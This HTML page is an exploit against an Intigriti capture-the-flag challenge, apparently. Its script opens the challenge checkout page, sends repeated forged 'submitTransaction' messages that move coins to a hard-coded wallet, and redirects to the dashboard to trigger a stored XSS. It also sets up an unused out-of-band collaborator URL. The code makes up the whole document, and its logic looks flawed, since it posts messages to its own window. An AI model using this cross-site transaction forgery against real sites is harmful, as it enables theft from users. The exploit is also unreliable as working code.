<!DOCTYPE html>
<html>
<body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;padding-top:20%;">
    <h1>REDIRECTING TO SECURE TERMINAL...</h1>
    <script>
        const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2'; 
        const CHALLENGE_URL = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
        const COLLAB = 'https://mpfutxwohcfjl4jtof01abeomfs6g04p.oastify.com';

        // Step 1: Force a Top-Level Navigation
        // This makes Chrome treat the request as "Same-Site" for cookie delivery
        const heist = window.open(CHALLENGE_URL, '_top'); 

        // Step 2: Spam the postMessage
        // Because we used '_top', we need to spam the message BEFORE the page 
        // fully navigates away from our control.
        let count = 0;
        const interval = setInterval(() => {
            window.postMessage({
                type: 'submitTransaction',
                transaction: {
                    currency: '1337COIN',
                    amount: 1, 
                    toAddress: MY_WALLET
                }
            }, '*');
            count++;
            if (count > 50) clearInterval(interval);
        }, 100);

        // Step 3: Trigger the Stored XSS on the Dashboard
        // We use the 'updateContent' vulnerability from your source image
        setTimeout(() => {
            window.location.href = 'https://challenge-0126.intigriti.io/dashboard.html';
        }, 5000);
    </script>
</body>
</html>
